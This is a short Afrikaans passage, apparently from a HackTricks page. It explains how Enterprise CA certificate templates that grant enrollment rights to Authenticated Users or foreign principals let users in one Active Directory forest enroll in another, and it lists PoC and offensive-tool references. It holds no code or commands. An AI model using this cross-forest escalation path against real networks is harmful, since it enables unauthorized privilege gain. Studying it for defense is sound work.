In multi-forest-omgewings is versigtigheid nodig met Enterprise CAs wat **certificate templates publiseer** wat **Authenticated Users of foreign principals** (gebruikers/groepe buite die forest waaraan die Enterprise CA behoort) **enrollment- en wysigingsregte** toelaat.\
Wanneer oor ’n trust geauthentiseer word, word die **Authenticated Users SID** deur AD by die gebruiker se token gevoeg. Dus, indien ’n domain ’n Enterprise CA besit met ’n template wat **Authenticated Users enrollment-regte toelaat**, kan ’n gebruiker uit ’n ander forest moontlik **enrollment vir die template doen**. Net so, indien **enrollment-regte uitdruklik deur ’n template aan ’n foreign principal toegeken word**, word ’n **cross-forest toegangsbeheer-verhouding** daardeur geskep, wat ’n principal uit een forest in staat stel om **enrollment vir ’n template uit ’n ander forest te doen**.

Albei scenario’s lei tot ’n **toename in die attack surface** van een forest na ’n ander. Die instellings van die certificate template kan deur ’n aanvaller uitgebuit word om bykomende voorregte in ’n foreign domain te verkry.


## Verwysings

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
